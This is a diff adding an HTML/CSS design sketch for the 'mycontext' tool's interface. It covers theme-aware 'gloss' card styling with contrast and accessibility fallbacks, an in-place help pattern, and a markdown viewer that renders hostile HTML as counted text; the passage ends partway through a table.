@@ -1,0 +1,1394 @@
+<!--
+  10-requirements.html — the owner's five requirements, made concrete.
+  Companion to reports/uiux/adversarial/A3-requirements.md
+
+  Demonstrates three of the five, runnably:
+    R1  the markdown viewer — a real renderer, running, producing DOM with NO
+        innerHTML anywhere. Feed it the hostile sample and watch the payloads
+        arrive as text with a counted refusal ledger.
+    R4  integrated help in place — the `?` disclosure beside the control it
+        explains, in the flow, with the four fixed parts and no new prose.
+    R5  the gloss — in BOTH themes side by side, with its contrast measured at
+        runtime and printed, plus live switches for reduced-transparency,
+        forced-colors and print.
+
+  Honest notes about this file, since the project's recorded defect is asserting
+  a property the code does not have:
+
+  * This sketch carries an inline <style> and an inline <script>. The SHIPPED app
+    cannot: `style-src 'self'; script-src 'self'` forbids both. In the product
+    these are `public/styles.css` and `public/lib/markdown.js`. Nothing else here
+    changes shape when they move out of the file.
+  * Every number in a "measured" readout is computed in this page, in this
+    browser, from the tokens as resolved — not typed in. Every number that is
+    illustrative is tagged `illustrative`.
+  * All corpus text below is fabricated. The item ids, paths and counts are
+    demo data. The MARKDOWN SOURCE in the R1 pane is deliberately hostile.
+  * Logical properties only. The one non-logical thing in the sheet is the
+    gloss gradient's axis, and it is VERTICAL precisely so that it needs no
+    RTL mirroring — see A3-requirements.md R5.
+-->
+<title>mycontext — R1 markdown, R4 help in place, R5 the gloss</title>
+<style>
+/* ═══════════════════════════════════════════════════════════════════════════
+   TOKENS
+   Base set from 04-visual.md's proposal, with 06-a11y.md's six corrected
+   values applied (each carries the ratio it replaced), plus four new tokens
+   that are the whole of R5.
+   ═══════════════════════════════════════════════════════════════════════════ */
+:root{
+  color-scheme:light dark;
+
+  --paper:light-dark(#f7f6f2,#0f0f12);
+  --panel:light-dark(#fffffe,#17171c);
+  --panel-2:light-dark(#fbfaf7,#1d1d24);
+  --sink:light-dark(#eeece5,#101014);
+  --stripe:light-dark(#f4f2ec,#131318);
+
+  --ink:light-dark(#17171b,#ecebe4);
+  --dim:light-dark(#65635d,#928f87);
+  /* was #78766f / #8a877f → 3.14:1 and 3.07:1 on --panel. Corrected. */
+  --faint:light-dark(#5f5d57,#a5a29a);
+  --rule:light-dark(#e2dfd6,#262630);
+  /* --edge is a CONTROL boundary everywhere it appears, so it owes 3:1 and
+     measured 1.65:1. --edge-3 is the corrected one; --rule stays decorative. */
+  --edge:light-dark(#cdc9bd,#3a3a45);
+  --edge-3:light-dark(#8d887a,#6e6e7e);
+
+  --gold:light-dark(#8a6d14,#dbb047);
+  --goldbg:color-mix(in oklch, var(--gold) 12%, var(--panel));
+  --ok:light-dark(#2f6a49,#68a482);
+  --warn:light-dark(#845a13,#c78f3d);
+  --warnbg:color-mix(in oklch, var(--warn) 12%, var(--panel));
+  --crit:light-dark(#93302f,#cd6b6b);
+  --critbg:color-mix(in oklch, var(--crit) 12%, var(--panel));
+
+  --e1:0 1px 1px light-dark(rgb(24 20 8/.05),rgb(0 0 0/.5)),
+       0 3px 10px light-dark(rgb(24 20 8/.05),rgb(0 0 0/.35));
+  --e3:0 4px 6px light-dark(rgb(24 20 8/.08),rgb(0 0 0/.6)),
+       0 16px 38px light-dark(rgb(24 20 8/.12),rgb(0 0 0/.55));
+
+  /* ── R5, the entire mechanism: four tokens and no filter ──────────────────
+     The rim is two zero-blur inset shadows: a lit leading edge and a shaded
+     trailing edge. In light mode the lit edge is nearly white on an off-white
+     panel and the SHADE does the work; in dark mode the panel is dark and the
+     LIT edge does the work. Same two lines, inverted by light-dark().
+     The sheen is ONE static gradient painted into the element's own background
+     layer, over an OPAQUE background-color. Nothing behind the card shows
+     through, so the contrast of text on it is a fixed, measurable number. */
+  --rim-lit:light-dark(rgb(255 255 255/.95),rgb(255 255 255/.10));
+  --rim-shade:light-dark(rgb(24 20 8/.07),rgb(0 0 0/.55));
+  --sheen-top:light-dark(rgb(255 255 255/.85),rgb(255 255 255/.055));
+  --sheen-bottom:light-dark(rgb(24 20 8/.035),rgb(0 0 0/.18));
+
+  --fs-00:10px; --fs-0:11px; --fs-1:12.5px; --fs-2:14px; --fs-3:16px; --fs-4:22px;
+  --sp-1:4px; --sp-2:8px; --sp-3:12px; --sp-4:16px; --sp-5:20px; --sp-6:24px;
+  --r-sm:3px; --r-md:5px; --r-lg:8px;
+
+  --sans:ui-sans-serif,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+}
+/* The side-by-side theme strip. light-dark() resolves against the element's
+   used color-scheme, so forcing it on a container gives a true both-themes view
+   in one screenshot without toggling anything. */
+.force-light{color-scheme:light}
+.force-dark{color-scheme:dark}
+
+*{box-sizing:border-box}
+html{background:var(--paper)}
+body{
+  margin:0;font:var(--fs-2)/1.55 var(--sans);color:var(--ink);
+  background:var(--paper);
+  padding:var(--sp-5);
+}
+h1{font-size:var(--fs-4);margin:0 0 var(--sp-2);letter-spacing:-.01em}
+h2{font-size:var(--fs-3);margin:var(--sp-6) 0 var(--sp-2)}
+h3{font-size:var(--fs-2);margin:var(--sp-4) 0 var(--sp-2)}
+p{margin:0 0 var(--sp-3)}
+.lede{color:var(--dim);max-inline-size:74ch;margin-block-end:var(--sp-4)}
+
+/* Identifiers, paths, globs, commands, flags: direction is KNOWN LTR.
+   This one rule is the most important line in the sheet — 06-a11y.md. */
+.m,code,kbd,pre{font-family:var(--mono);direction:ltr;unicode-bidi:isolate}
+/* Direction UNKNOWN — anything read off disk or out of the corpus. */
+bdi{unicode-bidi:isolate}
+:lang(he){text-transform:none;letter-spacing:normal}
+
+.eyebrow{
+  font-size:var(--fs-00);text-transform:uppercase;letter-spacing:.08em;
+  color:var(--faint);margin:0 0 var(--sp-2);font-weight:600;
+}
+.small{font-size:var(--fs-0);color:var(--dim)}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:var(--sp-4)}
+@media (max-width:960px){.grid2{grid-template-columns:1fr}}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   R5 — .gloss. One class. Applied ONLY to the five allowlisted card-scale
+   surfaces below; never to a row, a cell, a tree item, a chip or a dot.
+   The allowlist is enforced in the product by a source scan over styles.css,
+   the same shape as the logical-property scan (07-arch.md tier 1, rule 8).
+   ═══════════════════════════════════════════════════════════════════════════ */
+.gloss{
+  background-color:var(--panel);              /* OPAQUE. Always. */
+  background-image:linear-gradient(
+      to bottom,                              /* vertical ⇒ no RTL mirroring */
+      var(--sheen-top) 0%,
+      transparent 42%,
+      transparent 62%,
+      var(--sheen-bottom) 100%);
+  box-shadow:
+      var(--e1),
+      inset 0 1px 0 0 var(--rim-lit),         /* lit edge, 0 blur, 0 spread */
+      inset 0 -1px 0 0 var(--rim-shade);      /* shaded edge */
+  border:1px solid var(--edge-3);
+  border-radius:var(--r-lg);
+}
+.gloss.float{background-color:var(--panel-2);box-shadow:var(--e3),
+  inset 0 1px 0 0 var(--rim-lit),inset 0 -1px 0 0 var(--rim-shade)}
+
+/* Degradation. Three triggers, one outcome: the depth cue moves from PAINT to
+   EDGE, because an edge is the one thing every one of these preserves. */
+@media (prefers-reduced-transparency:reduce){
+  .gloss,.gloss.float{background-image:none;box-shadow:none;border-color:var(--ink)}
+}
+@media (prefers-contrast:more){
+  .gloss,.gloss.float{background-image:none;border-color:var(--ink)}
+}
+@media (forced-colors:active){
+  /* background-image on a non-<img> is NOT forced, so a surviving gradient
+     would wreck the system palette. Null it explicitly. Do NOT reach for
+     forced-color-adjust:none — let the system paint. */
+  .gloss,.gloss.float{background-image:none;box-shadow:none;
+    border:1px solid CanvasText;background-color:Canvas}
+  .dot,.chip{forced-color-adjust:auto}
+}
+/* The same three, driven by a checkbox so they can be SEEN without changing
+   an OS setting. Identical declarations, so the simulation cannot lie. */
+body.sim-rt .gloss,body.sim-rt .gloss.float{background-image:none;box-shadow:none;border-color:var(--ink)}
+body.sim-fc .gloss,body.sim-fc .gloss.float{background-image:none;box-shadow:none;
+  border:1px solid var(--ink);background-color:var(--panel)}
+body.sim-fc .chip,body.sim-fc .dot{background:none!important;border:1px solid var(--ink)!important;color:var(--ink)!important}
+
+@media print{
+  /* Gloss off, shadow off, gradient off. print-color-adjust is deliberately
+     NOT set to exact: forcing ink for decoration wastes the reader's toner. */
+  .gloss,.gloss.float{background-image:none!important;box-shadow:none!important;
+    border:1px solid #000!important;background-color:#fff!important}
+  .noprint{display:none!important}
+  /* And the measured defect worth landing in the same block: the mockup's
+     print rules hide every screen but one and never unhide that one, so
+     Ctrl+P prints blank. A print sheet must remove `hidden` from what it
+     means to print, not only hide what it does not. */
+  [hidden].printable{display:block!important}
+}
+body.sim-print .gloss,body.sim-print .gloss.float{
+  background-image:none;box-shadow:none;border:1px solid var(--ink);
+  background-color:light-dark(#fff,#fff);color:#000}
+body.sim-print .gloss *{color:#000}
+
+/* ── cards, chrome ──────────────────────────────────────────────────────── */
+.card{padding:var(--sp-4);margin-block-end:var(--sp-4)}
+.flat{background:var(--panel);border:1px solid var(--rule);border-radius:var(--r-lg);
+  padding:var(--sp-4);margin-block-end:var(--sp-4)}
+.banner{padding:var(--sp-3) var(--sp-4);margin-block-end:var(--sp-4);
+  border-inline-start:3px solid var(--warn)}
+
+.bar{display:flex;flex-wrap:wrap;gap:var(--sp-3);align-items:center;
+  margin-block-end:var(--sp-4);padding:var(--sp-3);border-radius:var(--r-md);
+  background:var(--sink);border:1px solid var(--rule)}
+.bar label{font-size:var(--fs-0);display:inline-flex;gap:var(--sp-1);align-items:center}
+button,select{font:inherit;font-size:var(--fs-1);color:var(--ink);
+  background:var(--panel);border:1px solid var(--edge-3);border-radius:var(--r-md);
+  padding:3px var(--sp-2);cursor:pointer}
+button:focus-visible,select:focus-visible,a:focus-visible,summary:focus-visible{
+  outline:2px solid var(--gold);outline-offset:2px}
+
+table{border-collapse:collapse;inline-size:100%;font-size:var(--fs-1)}
+th,td{text-align:start;padding:var(--sp-1) var(--sp-2);border-block-end:1px solid var(--rule);
+  vertical-align:top}
+th{color:var(--faint);font-size:var(--fs-00);text-transform:uppercase;letter-spacing:.06em}
+tbody tr:nth-child(even){background:var(--stripe)}
+.num{text-align:end;font-variant-numeric:tabular-nums}
+
+.chip{display:inline-block;font-size:var(--fs-00);padding:1px 6px;border-radius:var(--r-sm);
+  border:1px solid var(--edge-3);background:var(--sink);color:var(--dim);white-space:nowrap}
+.chip.ok{color:var(--ok)} .chip.warn{color:var(--warn)} .chip.crit{color:var(--crit)}
+.chip.gov{color:var(--gold);background:var(--goldbg)}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   R1 — the rendered-markdown surface.
+   `.doc` is deliberately the INVERSE of `.gloss`: an inset well on --sink with
+   a rule down its leading edge. Raised = the product is speaking. Inset =
+   this text came off disk and we are quoting it. That is the whole "how does a
+   reader tell semi-trusted corpus text from the product's own words" answer,
+   and it costs one background and one border.
+   ═══════════════════════════════════════════════════════════════════════════ */
+.doc{
+  background:var(--sink);
+  border:1px solid var(--rule);
+  border-inline-start:3px solid var(--edge-3);
+  border-radius:var(--r-md);
+  padding:var(--sp-4);
+  overflow-x:auto;
+}
+.doc-head{
+  display:flex;flex-wrap:wrap;gap:var(--sp-2);align-items:baseline;
+  font-size:var(--fs-0);color:var(--dim);
+  padding:var(--sp-2) var(--sp-3);background:var(--sink);
+  border:1px solid var(--rule);border-block-end:none;
+  border-start-start-radius:var(--r-md);border-start-end-radius:var(--r-md);
+}
+.doc-head + .doc{border-start-start-radius:0;border-start-end-radius:0}
+.doc-head strong{color:var(--ink);font-weight:600}
+
+/* Everything the renderer can emit. The renderer chooses from THIS list and
+   nothing else; a class name never comes from the document. */
+.doc h2,.doc h3,.doc h4,.doc h5,.doc h6{margin:var(--sp-4) 0 var(--sp-2);line-height:1.3}
+.doc h2{font-size:var(--fs-3)} .doc h3{font-size:var(--fs-2)}
+.doc h4,.doc h5,.doc h6{font-size:var(--fs-1);color:var(--dim)}
+.doc > :first-child{margin-block-start:0}
+.doc p{margin:0 0 var(--sp-3);font-size:var(--fs-2)}
+.doc ul,.doc ol{margin:0 0 var(--sp-3);padding-inline-start:var(--sp-5)}
+.doc li{margin-block-end:var(--sp-1);font-size:var(--fs-2)}
+.doc blockquote{margin:0 0 var(--sp-3);padding-inline-start:var(--sp-3);
+  border-inline-start:2px solid var(--edge);color:var(--dim)}
+.doc pre{margin:0 0 var(--sp-3);padding:var(--sp-3);background:var(--panel);
+  border:1px solid var(--rule);border-radius:var(--r-md);overflow-x:auto;
+  font-size:var(--fs-1);line-height:1.5}
+.doc code{font-size:.94em;background:var(--panel);border:1px solid var(--rule);
+  border-radius:var(--r-sm);padding:0 3px}
+.doc pre code{background:none;border:none;padding:0}
+.doc hr{border:none;border-block-start:1px solid var(--edge);margin:var(--sp-4) 0}
+.doc table{margin:0 0 var(--sp-3);background:var(--panel)}
+.doc details{margin:0 0 var(--sp-3);border:1px solid var(--rule);border-radius:var(--r-md);
+  background:var(--panel);padding:var(--sp-2) var(--sp-3)}
+.doc summary{cursor:pointer;font-weight:600;font-size:var(--fs-1)}
+.doc a{color:var(--ink);text-underline-offset:2px}
+.doc a.route{text-decoration-style:solid}
+
+/* Refused constructs. Rendered as TEXT, marked, counted, never dropped. */
+.refused{
+  display:block;font-family:var(--mono);direction:ltr;unicode-bidi:isolate;
+  white-space:pre-wrap;word-break:break-word;
+  font-size:var(--fs-1);
+  background:var(--critbg);border:1px dashed var(--crit);border-radius:var(--r-sm);
+  padding:var(--sp-1) var(--sp-2);margin:0 0 var(--sp-3);color:var(--ink);
+}
+.refused-in{
+  font-family:var(--mono);direction:ltr;unicode-bidi:isolate;
+  background:var(--critbg);border-block-end:1px dashed var(--crit);padding:0 2px;
+}
+.refused-tag{
+  display:block;font-family:var(--sans);font-size:var(--fs-00);
+  text-transform:uppercase;letter-spacing:.06em;color:var(--crit);margin-block-end:2px;
+}
+.ext{font-family:var(--mono);direction:ltr;unicode-bidi:isolate;font-size:.92em;color:var(--dim)}
+
+.ledger{padding:var(--sp-3) var(--sp-4);margin-block-end:0;
+  border-inline-start:3px solid var(--crit)}
+.ledger ul{margin:var(--sp-2) 0 0;padding-inline-start:var(--sp-5);font-size:var(--fs-1)}
+.ledger.clean{border-inline-start-color:var(--ok)}
+
+.srcpane{margin:0;padding:var(--sp-3);background:var(--sink);border:1px solid var(--rule);
+  border-radius:var(--r-md);font-size:var(--fs-1);overflow:auto;max-block-size:520px;
+  white-space:pre-wrap;word-break:break-word;direction:ltr;unicode-bidi:isolate}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   R4 — help in place. A button, and a region BELOW the control, in the flow.
+   Not a tooltip (unprintable, unlinkable, covers the control, and the current
+   mockup's popovers are unreachable by keyboard). Not a separate destination.
+   ═══════════════════════════════════════════════════════════════════════════ */
+.field{margin-block-end:var(--sp-4)}
+.fieldrow{display:flex;gap:var(--sp-2);align-items:center;flex-wrap:wrap}
+.q{display:block;font-size:var(--fs-1);font-weight:600;margin-block-end:2px}
+.q .why{font-weight:400;color:var(--dim)}
+.explain{
+  inline-size:18px;block-size:18px;padding:0;line-height:1;
+  border-radius:50%;font-size:var(--fs-0);font-weight:700;
+  color:var(--dim);background:var(--sink);border:1px solid var(--edge-3);
+}
+.explain[aria-expanded="true"]{color:var(--ink);background:var(--goldbg);border-color:var(--gold)}
+.help{
+  margin-block-start:var(--sp-2);padding:var(--sp-3);
+  background:var(--panel-2);border:1px solid var(--rule);
+  border-inline-start:3px solid var(--gold);border-radius:var(--r-md);
+  font-size:var(--fs-1);
+}
+.help h4{margin:0 0 2px;font-size:var(--fs-00);text-transform:uppercase;
+  letter-spacing:.06em;color:var(--faint);font-weight:600}
+.help section{margin-block-end:var(--sp-3)}
+.help section:last-child{margin-block-end:0}
+.help p{margin:0 0 var(--sp-1)}
+.src{font-size:var(--fs-00);color:var(--faint);font-style:normal}
+.src::before{content:"source: "}
+
+.cmd{padding:var(--sp-2) var(--sp-3);margin-block-start:var(--sp-1)}
+.cmd code{display:block;font-size:var(--fs-1);overflow-x:auto;white-space:pre;
+  padding-block:var(--sp-1)}
+.cmd .yes{color:var(--warn);font-weight:700;background:var(--warnbg);border-radius:2px;padding:0 2px}
+.cmdnote{font-size:var(--fs-0);color:var(--warn);margin-block-start:var(--sp-1)}
+.landing{font-size:var(--fs-0);color:var(--dim);margin-block-start:var(--sp-1)}
+
+input[type=text]{font:inherit;font-size:var(--fs-1);font-family:var(--mono);
+  direction:ltr;unicode-bidi:isolate;
+  color:var(--ink);background:var(--panel);border:1px solid var(--edge-3);
+  border-radius:var(--r-md);padding:3px var(--sp-2);min-inline-size:26ch}
+
+/* measured readouts */
+.meas{font-size:var(--fs-1);border-collapse:collapse}
+.meas td,.meas th{padding:2px var(--sp-2)}
+.pass{color:var(--ok);font-weight:700}
+.fail{color:var(--crit);font-weight:700}
+.tag-ill{font-size:var(--fs-00);color:var(--warn);border:1px solid var(--warn);
+  border-radius:var(--r-sm);padding:0 4px;text-transform:uppercase;letter-spacing:.05em}
+.vh{position:absolute;inline-size:1px;block-size:1px;overflow:hidden;clip-path:inset(50%);white-space:nowrap}
+.note{font-size:var(--fs-0);color:var(--dim);margin-block-start:var(--sp-2)}
+
+/* -- historical marker --------------------------------------------------------------------------
+   Added 2026-08-29. This page is a dated record, and the block at the top of
+   the body says so. Styled from this file's own tokens on purpose, and with
+   logical properties, so it behaves like the rest of the page.             */
+.histnote{background:var(--goldbg,var(--panel));border:1px solid var(--gold);
+  border-radius:var(--r-md,8px);padding-block:10px;padding-inline:13px;
+  font:13px/1.55 var(--sans);color:var(--ink);margin-block:12px 16px;margin-inline:0}
+.histnote b{color:var(--gold)}
+.histnote code{font-family:var(--mono);font-size:.9em;direction:ltr;unicode-bidi:isolate}
+</style>
+
+<body>
+
+<div class="histnote" dir="ltr">
+  <b>Historical &mdash; the design as of 2026-08-19.</b>
+  This sketch records the design as it stood on that date. It is kept, and still worth
+  reading, because its reasoning is what the mockup and the app were drawn from; it is
+  not synced forward. Where this page and <code>docs/design/web-ui-mockup.html</code>
+  differ, the mockup is current.
+</div>
+
+<h1>Five requirements, made concrete</h1>
+<p class="lede">
+  Companion sketch to <span class="m">reports/uiux/adversarial/A3-requirements.md</span>.
+  R1 (markdown), R4 (help in place) and R5 (the gloss, both themes) run here.
+  R2 and R3 are document and test designs and live in the report.
+</p>
+
+<div class="bar noprint" role="group" aria-label="demonstration switches">
+  <label><input type="checkbox" id="sw-rt"> simulate <span class="m">prefers-reduced-transparency</span></label>
+  <label><input type="checkbox" id="sw-fc"> simulate <span class="m">forced-colors</span></label>
+  <label><input type="checkbox" id="sw-print"> simulate <span class="m">@media print</span></label>
+  <label><input type="checkbox" id="sw-he"> Hebrew sample (RTL)</label>
+  <button id="sw-hostile" type="button" aria-pressed="false">load the hostile document</button>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════════════════
+     R5
+     ════════════════════════════════════════════════════════════════════════ -->
+<h2>R5 — the gloss, in both themes at once</h2>
+<p class="lede">
+  Left column forces <span class="m">color-scheme: light</span>, right forces
+  <span class="m">color-scheme: dark</span>. Same markup, same one
+  <span class="m">.gloss</span> class, same four tokens. The contrast figures under each
+  card are computed in this browser from the resolved tokens composited against the
+  sheen at its worst point — not typed in.
+</p>
+
+<div class="grid2">
+  <div class="force-light" data-theme="light">
+    <p class="eyebrow">light</p>
+    <div class="card gloss">
+      <p class="eyebrow">injection preview · <span class="m">event=tool</span></p>
+      <h3 style="margin-top:0">Delivered to this session</h3>
+      <p class="small">A resting card — <span class="m">--e1</span>. The gloss is the rim plus one
+        static gradient. Nothing behind it shows through.</p>
+      <table>
+        <thead><tr><th>item</th><th>tier</th><th class="num">tokens</th></tr></thead>
+        <tbody>
+          <tr><td><span class="m">CONST-postgres-pool-capped-at-20</span></td><td><span class="chip gov">◆ pinned</span></td><td class="num">142</td></tr>
+          <tr><td><span class="m">RULE-never-log-customer-email</span></td><td><span class="chip ok">○ jit</span></td><td class="num">96</td></tr>
+        </tbody>
+      </table>
+      <p class="note">Rows never get the gloss. That rule is what makes it free — see below.</p>
+    </div>
+    <div class="card gloss float">
+      <p class="eyebrow">floating — <span class="m">--e3</span> + <span class="m">--panel-2</span></p>
+      <p class="small" style="margin:0">A popover. In dark mode a drop shadow cannot say
+        "above" against a near-black page; the lit rim can.</p>
+    </div>
+    <div class="banner gloss">
+      <strong>The server that opened this page has exited.</strong>
+      <p class="small" style="margin:2px 0 0">Nothing was lost. Re-open with <span class="m">mycontext ui</span>.</p>
+    </div>
+    <div class="card gloss cmd">
+      <p class="eyebrow">the one place elevation carries product meaning</p>
+      <code>mycontext review promote DRAFT-retry-budget --scope "src/api/**" <span class="yes">--yes</span></code>
+      <p class="cmdnote">⚠ <span class="m">--yes</span> writes. It is greppable in your transcript on purpose.</p>
+    </div>
+    <table class="meas" data-meas="light"><caption class="vh">measured contrast, light</caption></table>
+  </div>
+
+  <div class="force-dark" data-theme="dark" style="background:var(--paper);padding:var(--sp-3);border-radius:var(--r-lg)">
+    <p class="eyebrow">dark</p>
+    <div class="card gloss">
+      <p class="eyebrow">injection preview · <span class="m">event=tool</span></p>
+      <h3 style="margin-top:0">Delivered to this session</h3>
+      <p class="small">Same card. The rim inverted: the lit edge now does the work and the
+        shade recedes, which is 04-visual.md's own dark-mode ask.</p>
+      <table>
+        <thead><tr><th>item</th><th>tier</th><th class="num">tokens</th></tr></thead>
+        <tbody>
+          <tr><td><span class="m">CONST-postgres-pool-capped-at-20</span></td><td><span class="chip gov">◆ pinned</span></td><td class="num">142</td></tr>
+          <tr><td><span class="m">RULE-never-log-customer-email</span></td><td><span class="chip ok">○ jit</span></td><td class="num">96</td></tr>
+        </tbody>
+      </table>
+      <p class="note">Rows never get the gloss. That rule is what makes it free — see below.</p>
+    </div>
+    <div class="card gloss float">
+      <p class="eyebrow">floating — <span class="m">--e3</span> + <span class="m">--panel-2</span></p>
+      <p class="small" style="margin:0">A popover. In dark mode a drop shadow cannot say
+        "above" against a near-black page; the lit rim can.</p>
+    </div>
+    <div class="banner gloss">
+      <strong>The server that opened this page has exited.</strong>
+      <p class="small" style="margin:2px 0 0">Nothing was lost. Re-open with <span class="m">mycontext ui</span>.</p>
+    </div>
+    <div class="card gloss cmd">
+      <p class="eyebrow">the one place elevation carries product meaning</p>
+      <code>mycontext review promote DRAFT-retry-budget --scope "src/api/**" <span class="yes">--yes</span></code>
+      <p class="cmdnote">⚠ <span class="m">--yes</span> writes. It is greppable in your transcript on purpose.</p>
+    </div>
+    <table class="meas" data-meas="dark"><caption class="vh">measured contrast, dark</caption></table>
+  </div>
+</div>
+
+<div class="flat">
+  <p class="eyebrow">what must NOT get it, and why that is the performance argument</p>
+  <table>
+    <thead><tr><th>surface</th><th>gloss?</th><th>reason</th></tr></thead>
+    <tbody>
+      <tr><td><span class="m">.card .floating .banner .empty .cmd</span></td><td><span class="chip ok">yes</span></td><td>≤ 12 per screen. Card-scale surfaces where "above the page" means something.</td></tr>
+      <tr><td><span class="m">tr td li [role=treeitem] .chip .dot</span></td><td><span class="chip crit">never</span></td><td>The coverage map is a 57,000-node tree. 12 gradient paints vs 57,000 is the whole cost story, and it is a selector rule, not an optimisation.</td></tr>
+      <tr><td>the provenance / staleness band</td><td><span class="chip crit">never</span></td><td>A caveat that looks detachable is a caveat that gets ignored. It is an inset, not a card.</td></tr>
+      <tr><td>quoted corpus text (<span class="m">.doc</span>, R1)</td><td><span class="chip crit">never — inverted</span></td><td>Inset well, not raised card. Depth becomes the reader's cue for <em>who is speaking</em>.</td></tr>
+      <tr><td>focus rings</td><td><span class="chip crit">never</span></td><td>A gloss under a ring lowers the ring's measured contrast.</td></tr>
+      <tr><td>the tier dots (gold vs green, <span class="m">1.04:1</span>)</td><td><span class="chip crit">never</span></td><td>R5 must not be sold as fixing that. The fix is shape + the word in the accessible name, and it stays 06-a11y.md's.</td></tr>
+    </tbody>
+  </table>
+  <p class="note">Enforced rather than promised: the source scan over <span class="m">styles.css</span> gains one
+  rule — <span class="m">.gloss</span> may appear only on the allowlisted selectors and never on the
+  banned ones. Same shape as the logical-property scan (07-arch.md, tier 1).</p>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════════════════
+     R1
+     ════════════════════════════════════════════════════════════════════════ -->
+<h2>R1 — the markdown viewer</h2>
+<p class="lede">
+  The renderer below is real and running. It produces DOM through
+  <span class="m">document.createElement</span> and <span class="m">.textContent</span> only; the string
+  <span class="m">innerHTML</span> is never <em>assigned</em> in this file — it occurs three times and
+  all three are prose, this sentence included, which is exactly what the source scan measures. Press
+  <em>load the hostile document</em> and watch a <span class="m">&lt;script&gt;</span> block, an
+  <span class="m">onerror</span> image, a <span class="m">javascript:</span> link and a
+  <span class="m">&lt;style&gt;</span> block all arrive as text, counted, in the ledger.
+</p>
+
+<div class="grid2">
+  <div>
+    <p class="eyebrow">source, as authored on disk</p>
+    <pre class="srcpane" id="src"></pre>
+  </div>
+  <div>
+    <div class="ledger gloss" id="ledger" role="status" aria-live="polite"></div>
+    <div class="doc-head">
+      <strong id="dh-path" class="m"></strong>
+      <span id="dh-meta"></span>
+      <span class="chip" id="dh-origin"></span>
+      <button type="button" id="toggle-src" class="noprint" aria-pressed="false">show source for the whole document</button>
+    </div>
+    <article class="doc" id="out" dir="ltr"></article>
+  </div>
+</div>
+
+<div class="flat">
+  <p class="eyebrow">the subset, stated</p>
+  <div class="grid2">
+    <div>
+      <p><strong>Rendered.</strong> ATX headings (demoted — the page owns its
+      <span class="m">&lt;h1&gt;</span>, a quoted document may not create a second one), paragraphs,
+      fenced and indented code, unordered and ordered lists to depth 3, block quotes to depth 2,
+      thematic breaks, GFM pipe tables with real <span class="m">&lt;th scope&gt;</span>, inline code,
+      strong, emphasis, strikethrough, and links under the policy below. Two HTML tag names are
+      recognised as <em>block markers</em> rather than parsed as HTML —
+      <span class="m">&lt;details&gt;</span> and <span class="m">&lt;summary&gt;</span> — because this
+      README's structure depends on them and dropping them would hide content. Two line-anchored
+      literals are not an HTML parser.</p>
+    </div>
+    <div>
+      <p><strong>Refused, and shown refusing.</strong> All other raw HTML, block and inline.
+      Images (<span class="m">img-src 'self' data:</span> means a corpus image is either broken or
+      a payload). Footnotes, definition lists, math, heading-id attributes, and anything else the
+      scanner does not recognise — which falls through to <em>paragraph text</em>, never to nothing.
+      Link targets survive in exactly three shapes: an in-document
+      <span class="m">#anchor</span>; a relative repo path matching
+      <span class="m">^[A-Za-z0-9._/-]+$</span> with no <span class="m">..</span> segment, turned into
+      an in-app route by the router and never by assigning <span class="m">href</span> from data;
+      and <span class="m">http(s)://</span>, which renders as text with the full URL visible and
+      <em>is not a link</em>. Everything else is literal text.</p>
+    </div>
+  </div>
+  <p class="note">
+    Size, <strong>measured rather than guessed</strong>: the renderer running on this page —
+    <span class="m">blocks()</span>, <span class="m">inline()</span>, <span class="m">build()</span>
+    and the link policy — is <strong>324 lines of code, 411 with its comments</strong>, and it renders
+    the whole subset above including the hostile cases. Shipped it needs hardened inline edge cases
+    and section-range rendering for R2, so budget <strong>~450–500 renderer lines + ~120 of viewer
+    chrome + ~250 of tests</strong>. <span class="m">marked</span> is ~4k lines and renders raw HTML by
+    default, which would then need a sanitiser — a second dependency. The subset is smaller
+    <em>because</em> it refuses.
+  </p>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════════════════
+     R4
+     ════════════════════════════════════════════════════════════════════════ -->
+<h2>R4 — integrated help, where the user must act</h2>
+<p class="lede">
+  A composer, mid-task. Every <span class="m">?</span> opens <em>in the flow, under the control</em> —
+  never a tooltip, which cannot be printed, cannot be linked, vanishes while you type, and in the
+  current mockup cannot be reached by keyboard at all. The expanded state is a URL parameter
+  (<span class="m">?explain=scope</span>), so a doctor finding or a tutorial step can link straight
+  to an open explanation.
+</p>
+
+<div class="card gloss" style="max-inline-size:70ch">
+  <p class="eyebrow">compose · promote a draft</p>
+
+  <div class="field">
+    <div class="fieldrow">
+      <label class="q" for="f-scope">Which files should this govern?
+        <span class="why">— scope</span></label>
+      <button class="explain" type="button" id="x-scope-btn" aria-expanded="false"
+        aria-controls="x-scope" aria-label="explain scope">?</button>
+    </div>
+    <div class="fieldrow">
+      <input type="text" id="f-scope" value="src/api/**">
+      <span class="chip ok">matches 38 files</span>
+    </div>
+    <div class="help" id="x-scope" role="region" aria-labelledby="x-scope-btn" hidden></div>
+  </div>
+
+  <div class="field">
+    <div class="fieldrow">
+      <label class="q" for="f-yes">Write it?
+        <span class="why">— <span class="m">--yes</span></span></label>
+      <button class="explain" type="button" id="x-yes-btn" aria-expanded="false"
+        aria-controls="x-yes" aria-label="explain --yes">?</button>
+    </div>
+    <div class="fieldrow">
+      <select id="f-yes"><option>compose with --yes</option><option>compose without --yes</option></select>
+    </div>
+    <div class="help" id="x-yes" role="region" aria-labelledby="x-yes-btn" hidden></div>
+  </div>
+
+  <div class="cmd flat" style="margin-block-end:0">
+    <p class="eyebrow" style="margin:0 0 2px">run this in your terminal — this page never writes</p>
+    <code>mycontext review promote DRAFT-retry-budget --scope "src/api/**" <span class="yes">--yes</span></code>
+    <p class="landing"><strong>How you will know it worked:</strong> the audit log gains a record with
+      <span class="m">op: promote</span>, <span class="m">origin: human</span>. This card will say
+      <em>landed</em> and print that record's own timestamp. Until it does it says
+      <em>not seen yet</em> — never <em>not run</em>.</p>
+  </div>
+</div>
+
+<div class="flat">
+  <p class="eyebrow">where the words come from — and why this cannot become a fifth spelling</p>
+  <table>
+    <thead><tr><th>what the user needs</th><th>where it already lives</th><th>how the UI reads it</th></tr></thead>
+    <tbody>
